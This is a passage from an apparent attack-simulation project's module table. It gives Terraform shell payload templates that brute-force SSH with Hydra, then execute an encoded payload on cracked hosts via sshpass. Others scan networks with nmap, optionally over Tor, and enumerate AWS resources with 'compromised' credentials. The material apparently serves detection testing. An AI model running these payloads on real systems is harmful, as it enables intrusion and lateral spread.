&#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        &&#35;125;<br/>        &#35; Read Hydra output file line by line<br/>        while IFS= read &#45;r line; do<br/>            &#35; Parse Hydra output<br/>            host=$&&#35;40;echo &quot;$line&quot; &#124; awk &&#35;x27;&&#35;123;print $3&&#35;125;&&#35;x27;&&#35;41;<br/>            username=$&&#35;40;echo &quot;$line&quot; &#124; awk &&#35;x27;&&#35;123;print $5&&#35;125;&&#35;x27;&&#35;41;<br/>            password=$&&#35;40;echo &quot;$line&quot; &#124; awk &&#35;x27;&&#35;123;print $7&&#35;125;&&#35;x27;&&#35;41;<br/>            log &quot;Attempting to execute payload: sshpass &#45;p &&#35;92;&quot;$password&&#35;92;&quot; ssh &#45;o StrictHostKeyChecking=no &&#35;92;&quot;$username&&#35;92;&quot;@&&#35;92;&quot;$host&&#35;92;&quot; &&#35;x27;echo $&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash&quot;<br/>            sshpass &#45;p &quot;$password&quot; ssh &#45;o StrictHostKeyChecking=no &quot;$username&quot;@&quot;$host&quot; &&#35;x27;echo $&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash&&#35;x27;<br/>            log &quot;Done&quot;<br/>        done &lt; &lt;&&#35;40;grep &#45;v &quot;^&#35;&quot; /tmp/hydra&#45;found&#46;txt &#124; sort &#124; uniq&&#35;41;<br/>        log &quot;Done&#46;&quot;<br/><br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;sshpass jq&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;sshpass jq&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-ssm-execute-docker-nmap                                             | ./modules/ssm/execute-docker-nmap                              | ssm_exec_docker_nmap_target                | context.aws.ssm.target.execute.docker_nmap                                | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": true,<br/>                            "targets": [],<br/>                            "use_tor": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                              | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/nmap&quot;<br/>    attack&&#35;95;script = &quot;nmap&#46;sh&quot;<br/>    start&&#35;95;script = &quot;delayed&&#35;95;start&#46;sh&quot;<br/>    lock&&#35;95;file = &quot;/tmp/delay&&#35;95;nmap&#46;lock&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        LOCAL&&#35;95;NET=$&&#35;40;ip &#45;o &#45;f inet addr show &#124; awk &&#35;x27;/scope global/ &&#35;123;print $4&&#35;125;&&#35;x27; &#124; head &#45;1&&#35;41;<br/>        log &quot;LOCAL&&#35;95;NET: $LOCAL&&#35;95;NET&quot;<br/>        log &quot;Targets: $&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41;&&#35;125;&quot;<br/>        echo &quot;$&&#35;123; length&&#35;40;var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41; &gt; 0 ? join&&#35;40;&quot;&&#35;92;n&quot;, var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;&&#35;41; : &quot;$LOCAL&&#35;95;NET&quot; &&#35;125;&quot; &gt; /tmp/nmap&#45;targets&#46;txt<br/>        log &quot;Ports: $&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125;&quot;<br/>        if docker ps &#45;a &#124; grep $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;; then <br/>            docker stop $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>            docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        fi<br/>        $&&#35;123; var&#46;inputs&&#35;91;&quot;use&&#35;95;tor&quot;&&#35;93; == true ? &lt;&lt;&#45;EOF<br/>        log &quot;Using tor network&#46;&#46;&#46;&quot;<br/>        if &#33; docker ps &#124; grep torproxy &gt; /dev/null; then<br/>        docker run &#45;d &#45;&#45;rm &#45;&#45;name torproxy &#45;p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$&&#35;40;docker inspect &#45;f &&#35;x27;&&#35;123;&&#35;123;range &#46;NetworkSettings&#46;Networks&&#35;125;&&#35;125;&&#35;123;&&#35;123;&#46;IPAddress&&#35;125;&&#35;125;&&#35;123;&&#35;123;end&&#35;125;&&#35;125;&&#35;x27; torproxy&&#35;41;<br/>        log &quot;Running via docker: proxychains nmap &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt&quot;<br/>        /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; nmap &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt &#124;&#124; true&quot; <br/>        /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        : &lt;&lt;&#45;EOF<br/>        log &quot;Running via docker: nmap &#45;Pn &#45;sS &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt&quot;<br/>        /bin/bash &#45;c &quot;docker run &#45;&#45;rm &#45;v /tmp:/tmp &#45;&#45;entrypoint=nmap &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;Pn &#45;sT &#45;T2 &#45;oX /tmp/scan&#46;xml &#45;p$&&#35;123;join&&#35;40;&quot;,&quot;, var&#46;inputs&&#35;91;&quot;ports&quot;&&#35;93;&&#35;41;&&#35;125; &#45;iL /tmp/nmap&#45;targets&#46;txt &#124;&#124; true&quot;<br/>        /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        &&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>            log &quot;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&quot;;<br/>            sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;&&#35;125;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = var&#46;inputs&&#35;91;&quot;attack&&#35;95;delay&quot;&&#35;93;<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-ssm-execute-generate-aws-cli-traffic                                | ./modules/ssm/execute-generate-aws-cli-traffic                 | ssm_exec_generate_aws_cli_traffic_target   | context.aws.ssm.target.execute.generate_aws_cli_traffic                   | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_aws_cli_traffic": {<br/>                            "commands": [<br/>                                "x=10",<br/>                                "opts=\"--output json --color off --no-cli-pager\"",<br/>                                "while [ $x -gt 0 ]; do ",<br/>                                "log \"Running: aws sts get-caller-identity $opts\"",<br/>                                "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws iam list-users $opts\"",<br/>                                "aws iam list-users $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws s3api list-buckets $opts\"",<br/>                                "aws s3api list-buckets $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-instances $opts\"",<br/>                                "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",<br/>                                "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-volumes $opts\"",<br/>                                "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-vpcs $opts\"",<br/>                                "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",<br/>                                "x=$(($x-1))",<br/>                                "done"<br/>                            ],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "aws-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-aws-cli-traffic                 | <pre>locals &&#35;123;<br/>    tool = &quot;aws&quot;<br/>    attack&&#35;95;dir = &quot;/generate&#45;aws&#45;cli&#45;traffic&quot;<br/>    aws&&#35;95;creds = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for u,k in var&#46;inputs&&#35;91;&quot;compromised&&#35;95;credentials&quot;&&#35;93;: &quot;echo &&#35;x27;$&&#35;123;k&#46;rendered&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;/&#46;env&#45;aws&#45;$&&#35;123;u&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    aws&&#35;95;commands = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for command in var&#46;inputs&&#35;91;&quot;commands&quot;&&#35;93;: &quot;$&&#35;123;command&&#35;125;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    $&&#35;123;local&#46;aws&&#35;95;creds&&#35;125;<br/>    source &#46;env&#45;aws&#45;$&&#35;123;var&#46;inputs&&#35;91;&quot;compromised&&#35;95;keys&&#35;95;user&quot;&&#35;93;&&#35;125;<br/>    PROFILE=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;profile&quot;&&#35;93;&&#35;125;&quot;<br/>    REGION=&quot;$&&#35;123;var&#46;inputs&&#35;91;&quot;region&quot;&&#35;93;&&#35;125;&quot;<br/>    aws configure set aws&&#35;95;access&&#35;95;key&&#35;95;id $AWS&&#35;95;ACCESS&&#35;95;KEY&&#35;95;ID &#45;&#45;profile=$PROFILE<br/>    aws configure set aws&&#35;95;secret&&#35;95;access&&#35;95;key $AWS&&#35;95;SECRET&&#35;95;ACCESS&&#35;95;KEY &#45;&#45;profile=$PROFILE<br/>    aws configure set region $REGION &#45;&#45;profile=$PROFILE<br/>    aws configure set output json &#45;&#45;profile=$PROFILE<br/>    log &quot;Running aws commands&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        $&&#35;123;local&#46;aws&&#35;95;commands&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        while &#33; command &#45;v $&&#35;123;local&#46;tool&&#35;125; &gt; /dev/null; do<br/>            log &quot;$&&#35;123;local&#46;tool&&#35;125; not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-ssm-execute-generate-web-traffic-target                             | ./modules/ssm/execute-generate-web-traffic                     | ssm_exec_generate_web_traffic_target       | context.aws.ssm.target.execute.generate_web_traffic                       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic                     | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/generate&#45;web&#45;traffic&quot;<br/>    curl&&#35;95;urls = join&&#35;40;&quot;&&#35;92;n&quot;, &&#35;91; for url in var&#46;inputs&&#35;91;&quot;urls&quot;&&#35;93;: &quot;curl &#45;s &#45;&#45;retry 20 &#45;&#45;retry&#45;connrefused &#45;&#45;retry&#45;delay 60 &#45;&#45;connect&#45;timeout 5 &&#35;x27;$&&#35;123;url&&#35;125;&&#35;x27;; log &&#35;92;&quot;curl $&&#35;123;url&&#35;125; result: $?&&#35;92;&quot;&quot; &&#35;93;&&#35;41;<br/>    payload = &lt;&lt;&#45;EOT<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    log &quot;Enumerating urls&#46;&#46;&#46;&quot;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;Running url enumeration:&&#35;92;n$&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;&quot;<br/>        $&&#35;123;local&#46;curl&&#35;95;urls&&#35;125;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = 